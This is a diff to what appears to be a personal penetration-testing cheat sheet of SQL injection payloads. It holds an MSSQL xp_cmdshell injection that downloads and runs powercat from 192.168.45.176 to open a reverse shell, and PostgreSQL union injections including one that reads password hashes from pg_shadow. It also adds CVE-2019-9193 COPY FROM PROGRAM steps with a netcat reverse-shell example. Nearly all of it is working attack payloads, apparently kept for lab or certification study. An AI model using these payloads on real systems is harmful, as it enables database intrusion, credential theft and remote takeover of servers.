@@ -239,7 +239,7 @@ kali@kali:~$ cat fileup.pub > authorized_keys
 ';EXEC xp_cmdshell 'powershell.exe -nop -w hidden -c "IEX ((New-Object Net.WebClient).DownloadString(''http://192.168.45.176/powercat.ps1''))"; powercat -c 192.168.45.176 -p 4444 -e powershell'; --
 ```
 
-### postgresql
+## postgresql
 ```bash
 ' order by 7 -- //
 ' union select 1, 1, 1, 1, 1, 1 -- //
@@ -267,4 +267,32 @@ cast((SELECT data_column FROM data_table LIMIT 1 OFFSET data_offset) as int)
 
 # Get current user's password!
 ' union select 'd', cast((SELECT concat('DATABASE: ',passwd) FROM pg_shadow limit 1 offset 1) as int), 1, 'd', 'd', null -- //
+```
+
+## **CVE-2019–9193**
+```bash
+
+1) [Optional] Drop the table you want to use if it already exists
+
+*DROP TABLE IF EXISTS cmd_exec;*
+
+2) Create the table you want to hold the command output
+
+*CREATE TABLE cmd_exec(cmd_output text);*
+
+3) Run the system command via the COPY FROM PROGRAM function
+
+*COPY cmd_exec FROM PROGRAM ‘id’;*
+
+```bash
+ex) COPY cmd_exec FROM PROGRAM 'nc 192.168.45.176 4444 -e /bin/bash'
+```
+
+4) [Optional] View the results
+
+*SELECT * FROM cmd_exec;*
+
+5) [Optional] Clean up after yourself
+
+*DROP TABLE IF EXISTS cmd_exec;*
 ```
